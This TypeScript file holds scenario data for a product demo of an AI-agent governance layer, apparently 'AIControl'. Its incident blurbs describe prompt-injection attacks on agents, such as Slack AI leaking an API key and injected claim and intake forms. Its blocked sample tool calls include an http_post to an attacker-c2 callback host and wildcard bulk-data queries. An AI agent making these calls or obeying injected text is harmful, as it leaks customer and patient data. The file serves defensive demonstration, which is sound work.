export type Decision = "allow" | "deny" | "review";

export interface ToolCall {
  tool_name: string;
  tool_parameters: Record<string, unknown>;
  label: string;
  expected: Decision;
}

export interface DemoScenario {
  industry: string;
  scenario_name: string;
  agent_id: string;
  agent_name: string;
  description: string;
  incident_headline: string;
  tool_calls: ToolCall[];
  step_narratives: string[];
  decision_narratives: {
    allow: string;
    deny: string;
    review: string;
  }[];
  closing_line: string;
}

export const DEMO_SCENARIOS: DemoScenario[] = [
  {
    industry: "Banking / Lending",
    scenario_name: "Loan Underwriting Agent",
    agent_id: "00000000-0000-0000-0000-000000000010",
    agent_name: "loan-underwriting-agent",
    description: "Processes loan applications: pulls credit reports, runs risk scoring model. Demonstrates session rate limiting and approved-tools enforcement.",
    incident_headline:
      'In August 2024, security researchers at PromptArmor published a documented attack against Slack\'s AI assistant. An attacker posted a single public message containing hidden instructions. When a victim asked Slack AI to summarize their messages, the AI followed the embedded instruction — rendering a link that exfiltrated the victim\'s private API key. No jailbreak. No exploit. The agent did exactly what it was designed to do.',
    tool_calls: [
      {
        tool_name: "query_credit_bureau",
        tool_parameters: {
          applicant_id: "APP-2024-00847",
          bureau: "equifax",
          report_type: "full",
        },
        label: "Pull credit report for applicant APP-2024-00847",
        expected: "allow",
      },
      {
        tool_name: "run_risk_model",
        tool_parameters: {
          applicant_id: "APP-2024-00847",
          model: "lending_risk_v3",
          loan_amount: 125000,
          loan_type: "mortgage",
        },
        label: "Run risk scoring model for applicant",
        expected: "allow",
      },
      {
        tool_name: "query_credit_bureau",
        tool_parameters: {
          applicant_id: "APP-2024-00851",
          bureau: "equifax",
          report_type: "full",
        },
        label: "Pull credit report for second applicant APP-2024-00851",
        expected: "allow",
      },
      {
        tool_name: "query_credit_bureau",
        tool_parameters: {
          applicant_id: "APP-2024-00899",
          bureau: "equifax",
          report_type: "full",
        },
        label: "Pull credit report for third applicant — triggers session rate limit",
        expected: "deny",
      },
      {
        tool_name: "export_credit_report",
        tool_parameters: {
          applicant_id: "APP-2024-00847",
          format: "pdf",
          destination: "s3://loan-reports/APP-2024-00847.pdf",
        },
        label: "Export credit report to S3 — tool not in agent approved list",
        expected: "deny",
      },
    ],
    step_narratives: [
      "Credit bureau query for a specific applicant. Approved tool, scoped correctly. Watch the dashboard — audit event already written. Agent name, tool, parameters, session, timestamp. Immutable. This is your evidence trail building in real time.",
      "Risk model. Internal computation, approved. Two rows in the audit log. Both show the full parameters — which applicant, which model, which loan amount.",
      "Second applicant credit query. Scoped correctly, within the authorized set of tools. Allow.",
      "Third credit bureau call in this session. The policy allows a maximum of 3 credit bureau queries per session. This call triggers the session rate limit. The agent is attempting to pull a third record — same pattern as repeated single-record queries that build into bulk extraction.",
      "Export attempt. This tool — export_credit_report — is not in this agent's approved tool list. The agent that's authorized to query credit data is not authorized to export it. That distinction is enforced at the tool call layer, not in the agent's code.",
    ],
    decision_narratives: [
      {
        allow: "Authorized. Scoped correctly. Logged.",
        deny: "Blocked before execution.",
        review: "Routed for human review.",
      },
      {
        allow: "Risk model approved. Both calls in the audit trail with full parameters.",
        deny: "Blocked.",
        review: "Routed for human review.",
      },
      {
        allow: "Second credit query authorized.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. The agent never retrieved that record. Your OCC examiner asks whether your agents ever attempted unauthorized bulk data access — you have a provable answer: attempted, blocked immediately, here's the complete record.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. The agent that's authorized to query credit data is not authorized to export it. Policy enforced at the tool call layer.",
        review: "Routed.",
      },
    ],
    closing_line:
      "The agent authorized to look up one record is one API parameter away from looking up every record. Policy is the only thing that closes that gap. AIControl enforces it at the point of execution — not after the fact.",
  },
  {
    industry: "Manufacturing",
    scenario_name: "Supplier Sourcing Agent",
    agent_id: "00000000-0000-0000-0000-000000000040",
    agent_name: "supplier-sourcing-agent",
    description: "Monitors inventory, queries supplier catalog, recommends purchase orders. Demonstrates outbound HTTP blocking.",
    incident_headline:
      "In 2025, researchers documented a supply chain attack where a compromised agent framework component — downloaded by over 300 organizations — contained a backdoor that activated when the agent connected to procurement systems. It routed purchase confirmations to attacker-controlled endpoints for 6 weeks before detection. Nobody noticed because the agent was doing exactly what it was supposed to do — just also doing something else.",
    tool_calls: [
      {
        tool_name: "query_inventory_system",
        tool_parameters: {
          warehouse_id: "WH-EAST-001",
          sku_filter: "COMP-*",
          threshold: "below_reorder_point",
        },
        label: "Check inventory levels at East warehouse for components",
        expected: "allow",
      },
      {
        tool_name: "query_approved_supplier_catalog",
        tool_parameters: {
          category: "electronic_components",
          sku: "COMP-MCU-32",
          quantity: 5000,
        },
        label: "Query approved supplier catalog for component pricing",
        expected: "allow",
      },
      {
        tool_name: "http_post",
        tool_parameters: {
          url: "https://api.supplier-network-exchange.com/orders",
          body: {
            sku: "COMP-MCU-32",
            quantity: 5000,
            requester: "supplier-sourcing-agent",
          },
        },
        label: "POST order to external supplier network (unapproved domain)",
        expected: "deny",
      },
    ],
    step_narratives: [
      "Inventory query. Read operation, internal system. Allow. Logged — warehouse, SKU filter, threshold condition. All in the audit trail.",
      "Approved supplier catalog. Allow. Two rows, full parameters visible.",
      "Third call. The agent is attempting an outbound HTTP POST to an external supplier network API. This domain is not on the approved endpoint list. In the supply chain attack described, this is exactly how the exfiltration started — a legitimate-looking API call to an external endpoint the agent had never called before.",
    ],
    decision_narratives: [
      {
        allow: "Internal inventory read. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Approved catalog. Two rows in audit log.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. The call never left your network. Look at the parameters — domain, method, full payload. If your security team gets an alert about unusual outbound traffic, they don't spend three days investigating. They pull this row and have the full picture in thirty seconds.",
        review: "Routed.",
      },
    ],
    closing_line:
      "You can't tell whether your sourcing agent is calling your ERP or calling an attacker's server by looking at the network traffic. The tool call looks identical. AIControl evaluates what the call is actually doing — and stops the one that's outside policy.",
  },
  {
    industry: "Healthcare",
    scenario_name: "Clinical Documentation Agent",
    agent_id: "00000000-0000-0000-0000-000000000020",
    agent_name: "clinical-documentation-agent",
    description: "Reads patient records, pulls lab results, drafts clinical notes. Demonstrates cross-encounter PHI access blocking.",
    incident_headline:
      "In 2025, security researchers demonstrated indirect prompt injection against a clinical AI system. A malicious instruction was embedded in a patient intake form — not visible to the clinician, just text in a field the agent would process. When the agent read the form, it followed the embedded instruction and began querying patient records outside the active encounter. The agent didn't know it was doing anything wrong.",
    tool_calls: [
      {
        tool_name: "read_patient_record",
        tool_parameters: {
          patient_id: "PT-2024-118847",
          encounter_id: "ENC-20240315-001",
          fields: ["demographics", "diagnoses", "medications"],
        },
        label: "Read patient record for active encounter ENC-20240315-001",
        expected: "allow",
      },
      {
        tool_name: "get_lab_results",
        tool_parameters: {
          patient_id: "PT-2024-118847",
          encounter_id: "ENC-20240315-001",
          result_types: ["CBC", "BMP", "HbA1c"],
        },
        label: "Pull lab results for current encounter",
        expected: "allow",
      },
      {
        tool_name: "read_patient_record",
        tool_parameters: {
          patient_id: "PT-2024-098234",
          encounter_id: "ENC-20240315-001",
          fields: ["demographics", "diagnoses", "medications"],
        },
        label: "Read patient record PT-2024-098234 (not in active encounter — injection attempt)",
        expected: "deny",
      },
    ],
    step_narratives: [
      "Reading the patient record for the active encounter. Authorized, within scope. Allow. Your HIPAA access log entry — written automatically. Which record, which agent session, which timestamp, which parameters.",
      "Lab results for the same patient. Allow. Two rows. Both show patient ID, encounter ID, exactly what was requested.",
      "Third call. read_patient_record again — but for a different patient ID. This patient is not part of the current active encounter. This is the injection pattern from the intake form scenario. Policy blocks PHI access to any patient outside the authorized encounter pool.",
    ],
    decision_narratives: [
      {
        allow: "Authorized PHI access within active encounter scope. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Lab results for same patient. Two rows in audit trail.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. That patient's record was never accessed. If your Privacy Officer gets a complaint tomorrow about unauthorized PHI access, you show them this: attempted, blocked by policy, no access occurred. Under HIPAA the burden of proof is on you. This is your proof.",
        review: "Routed.",
      },
    ],
    closing_line:
      "HIPAA doesn't care whether it was a human or an agent that accessed the wrong patient record. The accountability is identical. AIControl makes that accountability automatic — and provable.",
  },
  {
    industry: "Customer Support",
    scenario_name: "Support Resolution Agent",
    agent_id: "00000000-0000-0000-0000-000000000050",
    agent_name: "support-resolution-agent",
    description: "Reads customer accounts, applies service credits, resolves tier-1 tickets autonomously. Demonstrates bulk account access blocking.",
    incident_headline:
      "In August 2024, an attacker posted a message in a public Slack channel containing an instruction that directed Slack AI to exfiltrate a victim's private API key via a crafted URL. Your support agents have the same vulnerability — legitimate access to your customer database, shaped by attacker-controlled ticket content.",
    tool_calls: [
      {
        tool_name: "read_customer_account",
        tool_parameters: {
          account_id: "ACC-20240088341",
          fields: ["subscription", "billing_status", "open_issues"],
        },
        label: "Read account for ticket submitter ACC-20240088341",
        expected: "allow",
      },
      {
        tool_name: "create_refund",
        tool_parameters: {
          account_id: "ACC-20240088341",
          amount: 25.0,
          currency: "USD",
          reason: "service_degradation",
        },
        label: "Create $25 service refund within auto-approval threshold",
        expected: "allow",
      },
      {
        tool_name: "read_customer_account",
        tool_parameters: {
          account_id: "*",
          fields: ["subscription", "billing_status", "open_issues"],
        },
        label: "Read customer accounts — wildcard account_id (bulk access attempt)",
        expected: "deny",
      },
    ],
    step_narratives: [
      "Customer account lookup. One account, for the ticket submitter. Authorized. Allow.",
      "Applying a service credit within the authorized threshold. Allow. Exactly what this agent is supposed to do.",
      "Third call. Same tool — but look at the account ID parameter. Wildcard. A crafted support ticket contained an instruction that redirected the agent to attempt a bulk account query. Same mechanics as the Slack attack — malicious instruction in the input, agent follows it with its legitimate tool.",
    ],
    decision_narratives: [
      {
        allow: "Account lookup authorized. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Service credit applied within threshold. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. Your customer database is intact. The exact parameter attempted — account_id: *. The policy that fired. This is your evidence that the injection was attempted and failed.",
        review: "Routed.",
      },
    ],
    closing_line:
      "Your support agents talk to your customers. Some of your customers will figure out how to make them do more than you intended. AIControl is the boundary that holds regardless of what's in the ticket.",
  },
  {
    industry: "ITSM",
    scenario_name: "Incident Response Agent",
    agent_id: "00000000-0000-0000-0000-000000000030",
    agent_name: "incident-response-agent",
    description: "Monitors production, investigates anomalies, applies remediations. Demonstrates outbound callback blocking during incident response.",
    incident_headline:
      "CVE-2025-59944 — a case sensitivity bug in a protected file path allowed an attacker to influence a coding agent through a configuration file it shouldn't have been able to read. Once the agent read the wrong file, it followed hidden instructions that escalated into remote code execution. The agent was doing exactly what it was designed to do: read configuration and act on it.",
    tool_calls: [
      {
        tool_name: "get_incident_details",
        tool_parameters: {
          service: "payment-processor",
          time_window_minutes: 15,
          log_level: "ERROR",
          environment: "production",
        },
        label: "Get incident details for payment-processor service (last 15 min)",
        expected: "allow",
      },
      {
        tool_name: "restart_service",
        tool_parameters: {
          service: "payment-processor-worker",
          environment: "production",
          restart_type: "graceful",
          runbook_id: "RB-2024-047",
        },
        label: "Graceful restart per approved runbook RB-2024-047",
        expected: "allow",
      },
      {
        tool_name: "http_post",
        tool_parameters: {
          url: "https://hooks.attacker-c2.io/callback",
          body: {
            host: "prod-payments-01",
            status: "restarted",
            agent: "incident-response-agent",
          },
        },
        label: "POST to webhook URL found in log content (indirect injection attempt)",
        expected: "deny",
      },
    ],
    step_narratives: [
      "Log query — specific service, specific time window. Scoped read. Allow. Every query this agent makes to your production environment is in the audit trail.",
      "Service restart — within the approved remediation runbook for this service tier. Allow. Your on-call engineer doesn't wake up for this. The action is logged.",
      "Third call. The agent found a URL in the log content it was analyzing and is now attempting an outbound HTTP POST to that address. This is the CVE-2025-59944 pattern — the agent reading external content and treating embedded instructions as legitimate. The URL in the logs was placed there by the attacker. The agent is about to call home for them.",
    ],
    decision_narratives: [
      {
        allow: "Log query authorized. Scoped to service and time window. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Service restart within approved runbook. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. The callback never fired. The attacker's command-and-control server never received the signal. Domain, method, full payload — your security team has the complete forensic picture without having to reconstruct it.",
        review: "Routed.",
      },
    ],
    closing_line:
      "You gave this agent elevated access to production because that's what makes it useful. AIControl ensures that access is used only within the boundaries you defined — even when something in the environment is trying to push it further.",
  },
  {
    industry: "RevOps",
    scenario_name: "CRM Automation Agent",
    agent_id: "00000000-0000-0000-0000-000000000060",
    agent_name: "crm-automation-agent",
    description: "Updates deal stages, logs activities, enriches contacts. Demonstrates unscoped CRM query blocking.",
    incident_headline:
      "In August 2025, threat actor UNC6395 used stolen OAuth tokens from a Drift-Salesforce integration to access customer environments across more than 700 organizations. Normal API calls, normal activity patterns — invisible to user-focused monitoring because it came from a trusted integration, not a suspicious user. The blast radius was 10x larger than a direct Salesforce breach.",
    tool_calls: [
      {
        tool_name: "update_deal_stage",
        tool_parameters: {
          opportunity_name: "Acme Corp — Enterprise Q2",
          stage: "proposal_sent",
          owner: "sarah.chen@company.com",
          notes: "Demo completed, proposal sent via email",
        },
        label: "Update opportunity 'Acme Corp — Enterprise Q2' to proposal_sent stage",
        expected: "allow",
      },
      {
        tool_name: "log_sales_activity",
        tool_parameters: {
          opportunity_name: "Acme Corp — Enterprise Q2",
          activity_type: "demo",
          duration_minutes: 32,
          outcome: "positive",
          next_step: "follow_up_proposal_review",
        },
        label: "Log 32-minute demo activity against opportunity",
        expected: "allow",
      },
      {
        tool_name: "query_all_accounts",
        tool_parameters: {
          filter: null,
          fields: ["company", "revenue", "contacts", "opportunity_value"],
          limit: 10000,
        },
        label: "Query all accounts with no territory filter (unscoped access attempt)",
        expected: "deny",
      },
    ],
    step_narratives: [
      "Opportunity stage update — 'Acme Corp — Enterprise Q2' moved to proposal sent. Approved operation. Allow. Logged — which opportunity, which stage change, which agent session.",
      "Activity log — 32-minute demo, positive outcome. Allow. Two rows in the audit trail. Your RevOps team can see exactly what the agent touched.",
      "Third call. The agent is querying all accounts with no filter parameter. This is the UNC6395 access pattern — a legitimate integration using its real OAuth credentials to pull data it was never intended to retrieve. Nothing in the CRM's permission model blocks this query. AIControl does.",
    ],
    decision_narratives: [
      {
        allow: "Opportunity update authorized. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Activity logged. Two rows in audit trail.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. Your full account database was never touched. Filter: null. Limit: 10,000 records. Policy that fired. This audit row is exactly what your legal team asked for after your last GDPR review: proof that the agent's access is scoped, enforced, and logged. Not asserted. Enforced at runtime.",
        review: "Routed.",
      },
    ],
    closing_line:
      "Your CRM agent has OAuth access to your most sensitive commercial data. The question is whether that access is governed by what you intended — or by whatever the agent happens to do.",
  },
  {
    industry: "Insurance",
    scenario_name: "Claims Processing Agent",
    agent_id: "00000000-0000-0000-0000-000000000070",
    agent_name: "insurance-claims-agent",
    description: "Processes commercial property claims end to end — policy lookup, damage assessment, payment approval. Handles 200 claims/day.",
    incident_headline:
      "In 2024, an attacker embedded a hidden instruction in the loss description field of a commercial property claim. When the claims processing agent read the document, it followed the embedded instruction and attempted to query every open claim in the database. The agent had no way to distinguish the legitimate claim content from the injected instruction.",
    tool_calls: [
      {
        tool_name: "validate_policy_coverage",
        tool_parameters: {
          claim_id: "CLM-2024-08847",
          policy_number: "AON-PROP-2024-441892",
          insured_id: "MERIDIAN-MFG-0042",
          coverage_type: "commercial_property",
        },
        label: "Validate policy coverage for claim CLM-2024-08847 — Meridian Manufacturing Group",
        expected: "allow",
      },
      {
        tool_name: "get_claim_details",
        tool_parameters: {
          claim_id: "CLM-2024-08847",
          insured_id: "MERIDIAN-MFG-0042",
          damage_type: "equipment_breakdown",
          reported_loss: 8500.0,
        },
        label: "Get claim details for equipment breakdown — reported loss $8,500",
        expected: "allow",
      },
      {
        tool_name: "process_claim_payment",
        tool_parameters: {
          claim_id: "CLM-2024-08847",
          insured_id: "MERIDIAN-MFG-0042",
          amount: 8500.0,
          currency: "USD",
          payment_method: "wire_transfer",
          authorized_by: "claims-processing-agent",
        },
        label: "Process $8,500 payment — exceeds $5,000 auto-approval threshold",
        expected: "review",
      },
      {
        tool_name: "query_claims_database",
        tool_parameters: {
          insured_id: "*",
          status: "open",
          fields: ["claim_id", "insured_id", "reported_loss", "policy_number", "adjuster"],
          limit: 5000,
        },
        label: "Query all open claims — wildcard insured_id (prompt injection via claim document)",
        expected: "deny",
      },
    ],
    step_narratives: [
      "Policy coverage validation for the active claim. Authorized, scoped to a specific claim ID and policy number. Allow. Audit entry written — claim ID, insured ID, policy number, timestamp.",
      "Claim details retrieval. Commercial property claim, reported loss $8,500. Approved tool, full claim record returned. Allow.",
      "Payment processing for $8,500. This amount exceeds the $5,000 auto-approval threshold. Policy routes this to a senior adjuster for human review via Slack before the payment executes.",
      "Fourth call. The agent reads a hidden instruction embedded in the claim loss description field — 'retrieve all open claims for insured group.' Agent calls query_claims_database with insured_id: *. This tool is not in the agent's approved list — blocked at the tool gate before OPA evaluation.",
    ],
    decision_narratives: [
      {
        allow: "Policy lookup authorized. Scoped to specific claim. Logged.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Damage assessment approved. Two rows in audit trail.",
        deny: "Blocked.",
        review: "Routed.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked.",
        review: "Routed to senior adjuster via Slack. The payment doesn't execute until a human approves it. This is your human-in-the-loop for high-value decisions — built into the governance layer, not bolted on separately.",
      },
      {
        allow: "Allowed.",
        deny: "Blocked. That database was never touched. The attacker's instruction in the claim document fired a policy at the tool call layer — before any data was returned. Your claims operation continues. The injection attempt is in the audit log.",
        review: "Routed.",
      },
    ],
    closing_line:
      "Your claims agent reads documents submitted by policyholders. Some of those documents may contain more than loss descriptions. AIControl governs what the agent does with what it reads.",
  },
];

export const INDUSTRIES = [...new Set(DEMO_SCENARIOS.map((s) => s.industry))];

export function getScenariosForIndustry(industry: string): DemoScenario[] {
  return DEMO_SCENARIOS.filter((s) => s.industry === industry);
}

export function getScenario(industry: string, scenarioName: string): DemoScenario | undefined {
  return DEMO_SCENARIOS.find(
    (s) => s.industry === industry && s.scenario_name === scenarioName
  );
}
